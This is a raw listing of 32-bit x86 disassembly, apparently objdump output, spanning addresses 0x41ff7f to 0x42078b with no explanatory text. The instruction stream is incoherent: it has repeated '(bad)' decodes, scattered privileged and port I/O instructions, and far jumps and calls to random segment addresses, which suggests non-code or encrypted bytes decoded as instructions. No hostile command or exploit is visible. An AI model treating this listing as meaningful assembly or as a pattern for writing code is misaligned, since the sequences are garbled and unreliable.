  41ff7f:	xchg   DWORD PTR [ebx-0x58],eax
  41ff82:	cmc    
  41ff83:	int    0x4
  41ff85:	jae    0x41fff9
  41ff87:	popa   
  41ff88:	jg     0x41ffe0
  41ff8a:	fldlg2 
  41ff8c:	xor    cl,BYTE PTR [ebx+0x5280bcd5]
  41ff92:	jae    0x41ff49
  41ff94:	loop   0x41ff87
  41ff96:	cmp    eax,0xdef53b49
  41ff9b:	xor    al,0x12
  41ff9d:	cmp    eax,0xace95ea9
  41ffa2:	into   
  41ffa3:	and    DWORD PTR [edi],esp
  41ffa5:	sub    DWORD PTR [ecx],0x3b73169e
  41ffab:	dec    ebp
  41ffac:	mov    edx,DWORD PTR [ebp+0x6e]
  41ffaf:	iret   
  41ffb0:	daa    
  41ffb1:	in     al,dx
  41ffb2:	push   esp
  41ffb3:	pusha  
  41ffb4:	test   BYTE PTR [ebp-0x45],al
  41ffb7:	push   cs
  41ffb8:	out    dx,al
  41ffb9:	dec    esi
  41ffba:	and    eax,DWORD PTR [edi]
  41ffbc:	inc    esi
  41ffbd:	adc    DWORD PTR [edx-0x269a29b3],edx
  41ffc3:	mov    ch,0x16
  41ffc5:	aas    
  41ffc6:	pop    ss
  41ffc7:	retf   
  41ffc8:	pop    ecx
  41ffc9:	or     al,0x1e
  41ffcb:	sbb    ebp,DWORD PTR cs:[ebx+0x1998532]
  41ffd2:	sub    ebx,ecx
  41ffd4:	xor    bl,cl
  41ffd6:	dec    esi
  41ffd7:	jnp    0x41ffb8
  41ffd9:	idiv   ch
  41ffdb:	add    al,0x2c
  41ffdd:	jb     0x41ff90
  41ffdf:	outs   dx,DWORD PTR ds:[esi]
  41ffe0:	aad    0x6c
  41ffe2:	(bad)  
  41ffe4:	xchg   edx,eax
  41ffe5:	jp     0x42000b
  41ffe7:	aad    0xb1
  41ffe9:	xchg   esi,eax
  41ffea:	sub    DWORD PTR cs:0x53951793,edx
  41fff1:	jae    0x42001e
  41fff3:	jmp    0xa1a9:0xb27b797e
  41fffa:	outs   dx,DWORD PTR gs:[esi]
  41fffc:	imul   edi,DWORD PTR [ebp+0x78],0x21
  420000:	and    DWORD PTR [eax],0x4d
  420003:	clc    
  420004:	sbb    ch,BYTE PTR [eax+0x3c]
  420007:	rcl    ebx,cl
  420009:	adc    ch,dh
  42000b:	pop    ss
  42000c:	jno    0x420073
  42000e:	cmp    al,0xd
  420010:	push   ss
  420011:	mov    ah,0xfa
  420013:	jno    0x42005b
  420015:	and    DWORD PTR [esi-0x5747e89],esp
  42001b:	mov    bh,BYTE PTR [edi-0x4c277c27]
  420021:	inc    esp
  420022:	adc    cl,bl
  420024:	clc    
  420025:	es stos BYTE PTR es:[edi],al
  420027:	ss jmp 0x9257:0x912c48d0
  42002f:	push   ds
  420030:	mov    ebp,0x1d0e2092
  420035:	call   0xd0f1:0xdfd68e4c
  42003c:	xchg   esp,eax
  42003d:	and    dh,0x57
  420040:	ins    DWORD PTR es:[edi],dx
  420041:	in     al,dx
  420042:	adc    DWORD PTR [ecx],esi
  420044:	aam    0xd1
  420046:	pop    esi
  420047:	inc    ebx
  420048:	out    0x3a,al
  42004a:	test   al,0xbc
  42004c:	imul   ebx,DWORD PTR [ebp+0x5fe6eaf6],0xd26d6a6b
  420056:	test   eax,0xed6fdae0
  42005b:	or     eax,0x2eef08bd
  420060:	jp     0x41fffc
  420062:	jg     0x420055
  420064:	mov    gs:0xb783ae36,eax
  42006a:	xchg   BYTE PTR [edi],ch
  42006c:	xor    eax,0x7612b673
  420071:	ss mov esi,0x5c7ca400
  420077:	mov    WORD PTR [edx+0x7],es
  42007a:	or     bl,ah
  42007c:	dec    ecx
  42007d:	loope  0x4200bf
  42007f:	push   es
  420080:	int3   
  420081:	mov    WORD PTR [esp+ebp*4+0x1c],es
  420085:	jo     0x420035
  420087:	mov    ds:0x1a2f1f92,al
  42008c:	cmp    al,dh
  42008e:	cmp    eax,0x96ac2573
  420093:	fisub  WORD PTR [esi]
  420095:	mov    al,bl
  420097:	push   es
  420098:	retf   0xbc2f
  42009b:	ss jmp 0x255b:0x78443b2
  4200a3:	repnz test al,0x5c
  4200a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200a7:	ficomp WORD PTR [esi]
  4200a9:	clc    
  4200aa:	retf   0x470b
  4200ad:	scas   al,BYTE PTR es:[edi]
  4200ae:	and    eax,0x5b5654d6
  4200b3:	mov    eax,ds:0x42cd1702
  4200b8:	lea    edi,[ebx+0xf]
  4200bb:	jo     0x42010c
  4200bd:	pop    esp
  4200be:	aas    
  4200bf:	hlt    
  4200c0:	inc    ecx
  4200c1:	mov    eax,ds:0xb1204e67
  4200c6:	xor    DWORD PTR ds:0xfaf9458f,ecx
  4200cc:	mov    eax,ds:0x254042dc
  4200d1:	das    
  4200d2:	and    eax,0x9b269692
  4200d7:	popf   
  4200d8:	into   
  4200d9:	inc    ebp
  4200da:	repz push cs
  4200dc:	dec    ebp
  4200dd:	jns    0x4200fa
  4200df:	push   cs
  4200e0:	lds    ecx,FWORD PTR [ebp-0x870408c]
  4200e6:	fiadd  WORD PTR [edx]
  4200e8:	and    cl,BYTE PTR [ecx+0x7]
  4200eb:	mul    esi
  4200ed:	ror    BYTE PTR [esi+ebx*1],0xb5
  4200f1:	mov    al,0x6c
  4200f3:	dec    edi
  4200f4:	xor    al,0xfc
  4200f6:	fimul  DWORD PTR [ecx+eiz*4-0x30e8d039]
  4200fd:	rcl    edx,0x7a
  420100:	mov    ds:0xa48911b7,eax
  420105:	js     0x420106
  420107:	inc    esi
  420108:	int3   
  420109:	add    DWORD PTR [ebx+eax*2+0x53c87ba0],esp
  420110:	sbb    dh,BYTE PTR [eax]
  420112:	loop   0x420179
  420114:	mov    ebp,0x75ec42e7
  420119:	xor    edx,DWORD PTR [ecx]
  42011b:	stc    
  42011c:	neg    dh
  42011e:	je     0x42013d
  420120:	mov    eax,0xd5567acc
  420125:	jo     0x420178
  420127:	stc    
  420128:	bound  ecx,QWORD PTR [edx-0xc]
  42012b:	mov    ds:0xfaefb5a0,al
  420130:	mov    cl,0x1f
  420132:	nop    esp
  420135:	addr16 mov ebx,0x35967124
  42013b:	and    eax,0xa722da21
  420140:	xchg   esp,eax
  420141:	(bad)  
  420142:	fisttp WORD PTR [ebp-0x626ad5a1]
  420148:	mov    edi,0xcde97ab9
  42014d:	fwait
  42014e:	sub    eax,0x4fceccad
  420153:	sbb    al,0xb5
  420155:	xor    BYTE PTR [edi],bl
  420157:	clc    
  420158:	sub    dh,BYTE PTR [edx+edx*4]
  42015b:	mov    bh,0xf8
  42015d:	sub    eax,DWORD PTR [esp+eax*4]
  420160:	add    edi,ecx
  420162:	push   ss
  420163:	and    al,0x86
  420165:	shl    ah,cl
  420167:	jns    0x420119
  420169:	and    ch,bl
  42016b:	push   edi
  42016c:	icebp  
  42016d:	rcl    dh,0x97
  420170:	int    0x48
  420172:	cs sbb al,0x40
  420175:	shl    DWORD PTR [edx+ecx*8],0x91
  420179:	mov    ecx,0x66c90671
  42017e:	scas   al,BYTE PTR es:[edi]
  42017f:	ret    0xf62c
  420182:	shr    BYTE PTR [edx],1
  420184:	add    DWORD PTR [eax],0x0
  42018a:	add    BYTE PTR [eax],al
  42018c:	add    BYTE PTR [eax],al
  42018e:	add    BYTE PTR [eax],al
  420190:	add    BYTE PTR [edx+ecx*1-0x6060f363],dl
  420197:	xchg   ebp,eax
  420198:	call   0x8d75:0x7836e732
  42019f:	aaa    
  4201a0:	pop    edi
  4201a1:	fnstsw WORD PTR [ebx+0x1]
  4201a4:	add    BYTE PTR [ebx+eax*1+0x3a910000],ch
  4201ab:	fdivr  QWORD PTR [eax-0x2a313966]
  4201b1:	dec    DWORD PTR [esi+0x70c44c1a]
  4201b7:	out    0x3e,al
  4201b9:	xchg   ebx,eax
  4201ba:	gs ins DWORD PTR es:[edi],dx
  4201bc:	push   edx
  4201bd:	sub    DWORD PTR [edx-0x65d97641],0x3a86d24b
  4201c7:	std    
  4201c8:	cdq    
  4201c9:	sub    al,BYTE PTR [ecx-0x28]
  4201cc:	jmp    0x4ce1:0x84f7274f
  4201d3:	cmp    ah,BYTE PTR [ecx+0x37]
  4201d6:	mov    al,0x82
  4201d8:	xor    ah,BYTE PTR [edi+ebx*1+0x55]
  4201dc:	and    ebp,DWORD PTR [edi]
  4201de:	jge    0x420252
  4201e0:	shl    BYTE PTR ds:0xc1668c5f,0xe1
  4201e7:	jne    0x42021e
  4201e9:	jp     0x4201c5
  4201eb:	xchg   edx,eax
  4201ec:	jge    0x42024c
  4201ee:	dec    edx
  4201ef:	pop    esi
  4201f0:	pop    ss
  4201f1:	mov    edx,0x786eabe2
  4201f6:	cmp    eax,0x3e0d9e67
  4201fb:	loope  0x420242
  4201fd:	and    BYTE PTR [eax],0xbf
  420200:	mov    al,0xc0
  420202:	cmp    bl,BYTE PTR [ecx+0x5e021dc2]
  420208:	stc    
  420209:	xchg   DWORD PTR [ecx-0x1a],esi
  42020c:	mov    bl,BYTE PTR [ebx+0x4b]
  42020f:	outs   dx,DWORD PTR ds:[esi]
  420210:	inc    esi
  420211:	data16 (bad) 
  420213:	icebp  
  420214:	add    DWORD PTR [edx-0x4304f9a4],ebp
  42021a:	add    DWORD PTR [edi],esp
  42021c:	inc    ebp
  42021d:	inc    edx
  42021e:	xor    ah,BYTE PTR [ecx+0x15]
  420221:	pop    ebp
  420222:	ins    DWORD PTR es:[edi],dx
  420223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420224:	and    eax,0x233a36db
  420229:	imul   ebx,DWORD PTR [ebx+0x13],0x5ae706a5
  420230:	les    ecx,FWORD PTR [eax+ecx*8-0x3e]
  420234:	sahf   
  420235:	dec    ebx
  420236:	enter  0xf6a8,0x1e
  42023a:	fimul  DWORD PTR [eax]
  42023c:	scas   eax,DWORD PTR es:[edi]
  42023d:	out    0x8e,al
  42023f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420240:	test   al,0x2f
  420242:	jecxz  0x4201e0
  420244:	mov    WORD PTR [eax+ebx*2+0x18],es
  420248:	inc    edi
  420249:	and    edx,edx
  42024b:	or     BYTE PTR [edx-0x3f],ch
  42024e:	pop    es
  42024f:	jg     0x4202b5
  420251:	and    eax,0x5194e402
  420256:	inc    ecx
  420257:	stc    
  420258:	mov    ebp,0xfb12e71d
  42025d:	lahf   
  42025e:	xlat   BYTE PTR ds:[ebx]
  42025f:	test   eax,0xb9af6a39
  420264:	sahf   
  420265:	jl     0x420246
  420267:	or     al,BYTE PTR [ebp+edx*4-0x605e3d8e]
  42026e:	mov    ecx,0x5cbc4d2d
  420273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420274:	int    0x80
  420276:	repnz cmc 
  420278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420279:	push   ebp
  42027a:	adc    al,0xc3
  42027c:	jb     0x420235
  42027e:	adc    al,dh
  420280:	cs sahf 
  420282:	fucom  st(7)
  420284:	das    
  420285:	gs arpl si,bp
  420288:	pop    edi
  420289:	sub    al,0xc2
  42028b:	push   ds
  42028c:	xchg   esi,eax
  42028d:	sub    bh,BYTE PTR [eax+ecx*8+0x3d]
  420291:	push   ecx
  420292:	cmp    DWORD PTR gs:[esi-0x61],0xffffffb8
  420297:	or     edx,ebp
  420299:	js     0x4202b5
  42029b:	xor    eax,0x9f6d504f
  4202a0:	push   ds
  4202a1:	xor    esp,ebx
  4202a3:	in     al,dx
  4202a4:	aas    
  4202a5:	xor    bl,BYTE PTR [ebx]
  4202a7:	in     eax,0x5c
  4202a9:	mov    edx,0x5c512636
  4202ae:	fsqrt  
  4202b0:	loopne 0x420314
  4202b2:	sar    BYTE PTR [edx+ebx*4],1
  4202b5:	xchg   ebx,eax
  4202b6:	mov    dh,0x16
  4202b8:	mul    BYTE PTR [ecx+eax*2+0x7ec1577e]
  4202bf:	add    eax,esi
  4202c1:	or     edx,DWORD PTR [esi+0x1cb1202a]
  4202c7:	shl    BYTE PTR [esi+0x70],cl
  4202ca:	push   es
  4202cb:	xor    al,0x79
  4202cd:	not    ebp
  4202cf:	fist   WORD PTR [edx-0xc86eea6]
  4202d5:	and    BYTE PTR [eax-0x7f],0x10
  4202d9:	mov    ecx,0x95292407
  4202de:	ret    0x508f
  4202e1:	mov    ds:0xb8d6100e,al
  4202e6:	push   0x4641792f
  4202eb:	hlt    
  4202ec:	jmp    0x70d:0x13145452
  4202f3:	fsubr  DWORD PTR [esi]
  4202f5:	xchg   ecx,eax
  4202f6:	push   0xc37a3c7c
  4202fb:	pop    ecx
  4202fc:	std    
  4202fd:	aad    0x6f
  4202ff:	mov    esi,0x8d0b74d4
  420304:	mov    dh,0xab
  420306:	xor    al,0x4c
  420308:	addr16 jns 0x420382
  42030b:	push   ecx
  42030c:	call   0xee:0x6d51244e
  420313:	sbb    al,0xdb
  420315:	mov    edi,DWORD PTR [ecx+0x4d]
  420318:	inc    edi
  420319:	cmp    eax,0xbc47c50
  42031e:	adc    dl,BYTE PTR [ebx-0x3a]
  420321:	clc    
  420322:	in     al,0x6c
  420324:	arpl   WORD PTR [ecx+edi*2+0x8],di
  420328:	jmp    0x9c5b:0xf0b42e5d
  42032f:	aas    
  420330:	in     eax,0x53
  420332:	or     DWORD PTR [edi+esi*4+0x72],eax
  420336:	jl     0x420383
  420338:	sbb    DWORD PTR [edi-0x2e],esi
  42033b:	daa    
  42033c:	and    DWORD PTR [edx],ecx
  42033e:	mov    al,0x88
  420340:	pusha  
  420341:	fstp   TBYTE PTR ds:0x6b8499b2
  420347:	and    al,0xc0
  420349:	mov    esi,0x6d81135d
  42034e:	ins    BYTE PTR es:[edi],dx
  42034f:	jp     0x42031b
  420351:	cmp    esp,ecx
  420353:	cmp    ebp,eax
  420355:	int3   
  420356:	cmp    al,BYTE PTR [edx-0x5e8e28c2]
  42035c:	das    
  42035d:	xchg   DWORD PTR [edi-0x10],ebx
  420360:	lidtd  [edi-0x6b]
  420364:	shr    BYTE PTR [edi],0x48
  420367:	mov    ah,0x68
  420369:	inc    DWORD PTR [esi+0x32]
  42036c:	sbb    al,0xd5
  42036e:	jmp    0x434:0xedf7de6e
  420375:	das    
  420376:	daa    
  420377:	push   ebp
  420378:	jmp    0x3cf2:0x3d935130
  42037f:	mov    bl,0xb5
  420381:	or     dl,BYTE PTR [eax]
  420383:	lds    ebx,FWORD PTR [ebp+0x27]
  420386:	lods   al,BYTE PTR ds:[esi]
  420387:	push   eax
  420388:	neg    BYTE PTR ds:0x7a3fb8c8
  42038e:	push   0x3d
  420390:	(bad)  
  420391:	aad    0xc
  420393:	hlt    
  420394:	iret   
  420395:	push   ss
  420396:	addr16 ja 0x420386
  420399:	push   edi
  42039a:	adc    BYTE PTR [ecx],bh
  42039c:	ss rep stos BYTE PTR es:[edi],al
  42039f:	mov    ah,0x23
  4203a1:	push   ds
  4203a2:	fwait
  4203a3:	push   cs
  4203a4:	jb     0x42040d
  4203a6:	push   ebp
  4203a7:	arpl   WORD PTR [ebp-0x45002e6a],sp
  4203ad:	outs   dx,BYTE PTR ds:[esi]
  4203ae:	xlat   BYTE PTR ds:[ebx]
  4203af:	imul   esp,DWORD PTR ds:0xd2fd8986,0x13
  4203b6:	push   edi
  4203b7:	mov    ah,0xea
  4203b9:	popf   
  4203ba:	mov    eax,ds:0x42bf1939
  4203bf:	xor    eax,0x6b42d621
  4203c4:	push   edi
  4203c5:	xchg   bh,dl
  4203c7:	pop    esi
  4203c8:	pop    edx
  4203c9:	dec    DWORD PTR [eax]
  4203cb:	out    0x65,eax
  4203cd:	xchg   edx,eax
  4203ce:	sub    eax,0xe8ed5a36
  4203d3:	and    al,0x3e
  4203d5:	mov    ecx,DWORD PTR [ebp-0x32ede135]
  4203db:	in     eax,dx
  4203dc:	dec    ebp
  4203dd:	loop   0x4203fd
  4203df:	lds    eax,FWORD PTR [ebp-0x79907907]
  4203e5:	mov    esp,0x353b6c78
  4203ea:	xchg   ebp,eax
  4203eb:	fsub   QWORD PTR [edi]
  4203ed:	jp     0x4203d2
  4203ef:	mov    ebp,0x9c4c7333
  4203f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203f5:	add    DWORD PTR [edx-0x52786c02],0x5a
  4203fc:	push   edi
  4203fd:	and    DWORD PTR es:[ecx+edx*2+0x92e4cdc],ebx
  420405:	loopne 0x420443
  420407:	mov    eax,0xe47e3a
  42040c:	dec    esi
  42040d:	lods   al,BYTE PTR ds:[esi]
  42040e:	test   eax,0x7bf24985
  420413:	(bad)  
  420415:	loopne 0x4203ae
  420417:	imul   edx,DWORD PTR ds:0x6e3bb1c6,0xffffffda
  42041e:	dec    ebx
  42041f:	leave  
  420420:	inc    esi
  420421:	js     0x420428
  420423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420424:	std    
  420425:	cmp    al,0xc0
  420427:	mov    ebx,0xa61f5194
  42042c:	cmp    DWORD PTR [ebx+0x6d2c9fd],0x7b6f7363
  420436:	add    BYTE PTR [ecx+0x1f18b8e],0x41
  42043d:	aam    0x6b
  42043f:	and    edx,DWORD PTR [edx-0xdfb0ae6]
  420445:	sti    
  420446:	push   ss
  420447:	mov    eax,ecx
  420449:	inc    eax
  42044a:	xchg   esi,eax
  42044b:	mov    cl,0xaa
  42044d:	mov    ch,0x7e
  42044f:	xlat   BYTE PTR ds:[ebx]
  420450:	in     al,dx
  420451:	mov    bh,0x3b
  420453:	cmp    al,0x3b
  420455:	xchg   ebx,eax
  420456:	adc    al,0x14
  420458:	test   DWORD PTR [eax-0x7cbfeff1],0x9841f94a
  420462:	shr    BYTE PTR [edi-0x67f6cc4b],cl
  420468:	adc    DWORD PTR fs:[eax+0x22],edi
  42046c:	loopne 0x4204ae
  42046e:	leave  
  42046f:	xchg   esi,eax
  420470:	dec    edx
  420471:	fxch   st(7)
  420473:	retf   
  420474:	push   ss
  420475:	lahf   
  420476:	int    0x37
  420478:	outs   dx,BYTE PTR ds:[esi]
  420479:	add    eax,0xe49c0876
  42047e:	sbb    ebx,esi
  420480:	mov    ch,0xd3
  420482:	shl    BYTE PTR [ecx],0xf
  420485:	aas    
  420486:	push   ss
  420487:	xchg   BYTE PTR [edx+ecx*4],dh
  42048a:	sahf   
  42048b:	es out dx,eax
  42048d:	dec    ebp
  42048e:	sbb    BYTE PTR [esp+eiz*8],dl
  420491:	cmp    BYTE PTR [edx],al
  420493:	sbb    edx,ecx
  420495:	sbb    ch,BYTE PTR [esi-0x25]
  420498:	div    DWORD PTR [eax+0x77]
  42049b:	loope  0x420436
  42049d:	push   edx
  42049e:	jns    0x4204b4
  4204a0:	dec    ebx
  4204a1:	mov    al,ds:0xe2e8297d
  4204a6:	jecxz  0x420440
  4204a8:	xor    eax,esp
  4204aa:	aaa    
  4204ab:	mov    bh,0x73
  4204ad:	ret    
  4204ae:	das    
  4204af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204b0:	in     al,dx
  4204b1:	adc    eax,0x66dc9f59
  4204b6:	xor    DWORD PTR [ebp+ebx*8+0x25],0x2a
  4204bb:	xor    ch,BYTE PTR [ebx+edi*2+0x69]
  4204bf:	dec    esp
  4204c0:	iret   
  4204c1:	pushf  
  4204c2:	xlat   BYTE PTR ds:[ebx]
  4204c3:	xor    al,BYTE PTR [esi+0x5c58cdc6]
  4204c9:	mov    eax,ds:0x255db909
  4204ce:	cmp    eax,0xe6dafe65
  4204d3:	inc    edi
  4204d4:	das    
  4204d5:	loop   0x42053c
  4204d7:	call   0x113d2212
  4204dc:	arpl   WORD PTR [esi-0x431c87ce],bp
  4204e2:	lea    edx,[ebp-0xe]
  4204e5:	dec    edx
  4204e6:	mov    dl,0x70
  4204e8:	fwait
  4204e9:	imul   edi,DWORD PTR [esi],0x3e
  4204ec:	outs   dx,DWORD PTR ds:[esi]
  4204ed:	call   0x7829:0xde65055
  4204f4:	jmp    0x42049c
  4204f6:	cmp    al,0x65
  4204f8:	xor    al,0x6a
  4204fa:	sub    al,0x5f
  4204fd:	push   ecx
  4204fe:	pop    ss
  4204ff:	outs   dx,DWORD PTR ds:[esi]
  420500:	test   eax,0xda65fe28
  420505:	out    0x2c,eax
  420507:	xchg   esi,eax
  420508:	or     DWORD PTR [edx-0x6b],ebp
  42050b:	inc    ebx
  42050c:	jnp    0x4204b0
  42050e:	push   cs
  42050f:	mov    ebp,0x506b50c4
  420514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420515:	push   ecx
  420516:	mov    al,ds:0x127b8ab9
  42051b:	fstp   QWORD PTR [ebx-0x2d]
  42051e:	es cmp ebx,eax
  420521:	sbb    ch,al
  420523:	mov    ch,0x64
  420525:	inc    esp
  420526:	dec    esi
  420527:	jne    0x4205a8
  420529:	rcl    DWORD PTR [esi+0x12],cl
  42052c:	adc    BYTE PTR [eax+0x7d5515fc],bl
  420532:	inc    esp
  420533:	pop    DWORD PTR [edi-0x6d]
  420536:	pop    ebx
  420537:	rcl    DWORD PTR [eax+0x753c1a0a],0x0
  42053e:	int3   
  42053f:	adc    bh,BYTE PTR ds:0xc59ffb58
  420545:	jp     0x42052c
  420547:	jmp    0x96c5:0xbb0e3f04
  42054e:	mov    ds,WORD PTR [esi+0x2f]
  420551:	scas   eax,DWORD PTR es:[edi]
  420552:	adc    ebx,ebx
  420554:	sahf   
	...
  420561:	nop
  420562:	mov    bl,0x8c
  420564:	fild   QWORD PTR [edi-0x1b002c01]
  42056a:	and    dh,0xd4
  42056d:	mov    ah,0xa9
  42056f:	cld    
  420570:	call   0x4384fe
  420575:	lods   al,BYTE PTR ds:[esi]
  420576:	add    eax,DWORD PTR [eax]
  420578:	add    BYTE PTR [edx-0x63],dh
  42057b:	adc    eax,0x6001a34
  420580:	push   esi
  420581:	pusha  
  420582:	in     al,0x90
  420584:	scas   eax,DWORD PTR es:[edi]
  420585:	pop    edi
  420586:	sbb    al,0xe1
  420588:	fnstenv [ecx]
  42058a:	ret    0xeeec
  42058d:	mov    dl,0x23
  42058f:	sub    DWORD PTR [edi+0x6f8ae9a3],esp
  420595:	ds daa 
  420597:	jnp    0x4205d4
  420599:	or     BYTE PTR [ebx+0x355fe518],dl
  42059f:	xchg   edi,eax
  4205a0:	out    0x78,eax
  4205a2:	cwde   
  4205a3:	leave  
  4205a4:	pop    edi
  4205a5:	and    ebx,DWORD PTR [ebp+0x66dfc332]
  4205ab:	xor    DWORD PTR [edx+0xc],ecx
  4205ae:	rcr    DWORD PTR [ebp-0x4c0909df],cl
  4205b4:	sbb    eax,0x4f8d77ee
  4205b9:	sub    cl,BYTE PTR [ecx+0x4d]
  4205bc:	pushf  
  4205bd:	xchg   edx,eax
  4205be:	pop    ecx
  4205bf:	vpmadcsswd xmm14,xmm5,xmm7,XMMWORD PTR [ebp+0x651e64cd]
  4205c9:	scas   eax,DWORD PTR es:[edi]
  4205ca:	xlat   BYTE PTR ds:[ebx]
  4205cb:	mov    eax,0xbd744782
  4205d0:	adc    eax,0xc065498
  4205d5:	div    BYTE PTR [ebx]
  4205d7:	(bad)  
  4205d8:	jge    0x42055f
  4205da:	sbb    DWORD PTR [ecx],esp
  4205dc:	int3   
  4205dd:	das    
  4205de:	jnp    0x4205be
  4205e0:	push   esp
  4205e1:	add    dh,BYTE PTR [ecx-0x6bd93cc]
  4205e7:	out    0xb2,eax
  4205e9:	aas    
  4205ea:	mov    dh,0x4
  4205ec:	and    al,0xf4
  4205ee:	(bad)  
  4205ef:	arpl   WORD PTR [ebp+0x67ef0bd9],cx
  4205f5:	ss inc esp
  4205f7:	jns    0x42061a
  4205f9:	and    DWORD PTR [eax],edi
  4205fb:	mov    ch,BYTE PTR [ebx+0x71]
  4205fe:	and    eax,0x270728ad
  420603:	mov    ?,WORD PTR [ebx]
  420605:	inc    eax
  420606:	popf   
  420607:	stos   DWORD PTR es:[edi],eax
  420608:	push   es
  420609:	(bad)  
  42060a:	or     ecx,DWORD PTR [ecx+0x4c0b297]
  420610:	repz and DWORD PTR es:[esi+0x3],ebp
  420615:	xchg   esi,eax
  420616:	stos   BYTE PTR es:[edi],al
  420617:	cmc    
  420618:	out    0xe1,eax
  42061a:	scas   al,BYTE PTR es:[edi]
  42061b:	cdq    
  42061c:	in     al,0xd6
  42061e:	push   esi
  42061f:	mov    dl,0xf3
  420621:	xor    BYTE PTR [edx+0x27],bh
  420624:	outs   dx,BYTE PTR ds:[esi]
  420625:	add    DWORD PTR [edi+0x7b],esp
  420628:	(bad)  
  420629:	jmp    0x420654
  42062b:	adc    BYTE PTR [ebx],0x90
  42062e:	je     0x4205bc
  420630:	pop    ebx
  420631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420633:	pop    ecx
  420634:	call   ebx
  420636:	repnz xor eax,0x9b729266
  42063c:	lahf   
  42063d:	(bad)  
  42063e:	jb     0x42060c
  420640:	adc    al,0xe6
  420642:	ins    BYTE PTR es:[edi],dx
  420643:	rol    ebx,cl
  420645:	dec    edi
  420646:	fmul   DWORD PTR [esi]
  420648:	jmp    0xa69f:0x77c19387
  42064f:	adc    BYTE PTR [eax+0x35],al
  420652:	shr    BYTE PTR [edi],cl
  420654:	push   eax
  420655:	int3   
  420656:	fstp   QWORD PTR [ebx+0x7ddfdcb3]
  42065c:	loopne 0x420665
  42065e:	jae    0x420662
  420660:	pop    ecx
  420661:	cmp    eax,0xb40f9000
  420666:	and    esp,DWORD PTR [ecx+ecx*8-0x36]
  42066a:	and    eax,0xdf194bc0
  42066f:	dec    esp
  420670:	lock aam 0x83
  420673:	loopne 0x420636
  420675:	jmp    0x420659
  420677:	shl    BYTE PTR [eax-0x2c],cl
  42067a:	adc    al,0x80
  42067c:	ror    DWORD PTR [ebx+0x38],1
  42067f:	outs   dx,DWORD PTR ds:[esi]
  420680:	or     ebp,DWORD PTR [ecx]
  420682:	and    esi,DWORD PTR [ecx-0x3e]
  420685:	fidivr DWORD PTR [ecx+0x4a5efe7d]
  42068b:	mov    dh,0x94
  42068d:	jle    0x4206e3
  42068f:	or     al,0x63
  420691:	pop    eax
  420692:	xor    esi,edi
  420694:	jb     0x4206a4
  420696:	gs jp  0x42064e
  420699:	mov    WORD PTR [eax],ds
  42069b:	inc    edi
  42069c:	daa    
  42069d:	mov    DWORD PTR [edi],eax
  42069f:	cmp    BYTE PTR [ebx-0x6497c7fa],dl
  4206a5:	idiv   DWORD PTR ds:[eax+0x50]
  4206a9:	adc    ebp,DWORD PTR ds:0x1442046b
  4206af:	int3   
  4206b0:	sub    DWORD PTR [esi+ecx*1-0x22],edx
  4206b4:	cli    
  4206b5:	daa    
  4206b6:	xor    BYTE PTR [ebp-0x6f],ah
  4206b9:	call   0x56f3:0x8b9e3022
  4206c0:	and    esi,DWORD PTR [edi+0x61dcf1ed]
  4206c6:	jl     0x420746
  4206c8:	sbb    BYTE PTR [edi],ah
  4206ca:	dec    esi
  4206cb:	push   ds
  4206cc:	inc    esi
  4206cd:	cli    
  4206ce:	pop    es
  4206cf:	mov    al,ds:0xa7ede1a4
  4206d4:	cmp    BYTE PTR [ebp-0x3c],0xd8
  4206d8:	pop    es
  4206d9:	iret   
  4206da:	sbb    BYTE PTR [esi+0x4a],bl
  4206dd:	add    DWORD PTR [ebx],edi
  4206df:	mov    WORD PTR [esi+0x61d342a8],ds
  4206e5:	add    DWORD PTR [eax-0x1b2be4c2],esp
  4206eb:	pop    ebx
  4206ec:	js     0x420746
  4206ee:	jg     0x42071d
  4206f0:	in     al,0xf6
  4206f2:	mov    bl,0xb1
  4206f4:	mov    ss,WORD PTR [esi+ebp*1]
  4206f7:	les    esi,FWORD PTR [edi+0x7a]
  4206fa:	pop    es
  4206fb:	mov    bl,0x6b
  4206fd:	out    0x65,al
  4206ff:	(bad)  
  420701:	fsub   st,st(4)
  420703:	sahf   
  420704:	or     al,BYTE PTR [ebp*8-0x74c13797]
  42070b:	(bad)  
  42070c:	jmp    0x969597e5
  420711:	lea    edx,[ecx]
  420713:	repnz inc eax
  420715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420716:	jmp    0x420731
  420718:	mov    al,0x8d
  42071a:	cdq    
  42071b:	mov    esi,0x320bd2a9
  420720:	fstp   QWORD PTR [edi-0x7a1114b2]
  420726:	or     bl,bh
  420728:	push   ds
  420729:	mov    bh,0x5f
  42072b:	data16 sub al,0xa0
  42072e:	out    dx,al
  42072f:	sti    
  420730:	push   eax
  420731:	sbb    al,0xe9
  420733:	fcomp  QWORD PTR [eax-0x55]
  420736:	sbb    dh,dl
  420738:	add    eax,0xb6d5ec3d
  42073d:	out    dx,eax
  42073e:	add    eax,0x4fb446a3
  420743:	std    
  420744:	inc    ebx
  420745:	xchg   DWORD PTR [eax+ecx*8+0x29],eax
  420749:	sbb    ah,BYTE PTR [eax+0x5e677bc8]
  42074f:	jae    0x420798
  420751:	push   0x975c0651
  420756:	retf   
  420757:	push   0xe2f5e3fd
  42075c:	adc    ch,BYTE PTR [edx-0x75b5fd71]
  420762:	dec    ebp
  420763:	out    dx,eax
  420764:	outs   dx,BYTE PTR ds:[esi]
  420765:	(bad)  
  420766:	jg     0x4207cb
  420768:	push   ds
  420769:	xchg   cx,ax
  42076b:	mov    cl,0x30
  42076d:	test   cl,bl
  42076f:	sti    
  420770:	test   ebx,0x7396da79
  420776:	stc    
  420777:	mov    fs,esi
  420779:	jmp    0xa9e582f5
  42077e:	cdq    
  42077f:	mov    dl,0x93
  420781:	xchg   DWORD PTR [esi+0x11],edi
  420784:	dec    esp
  420785:	cld    
  420786:	and    eax,0x43c9b8b2
  42078b:	ins    DWORD PTR es:[edi],dx
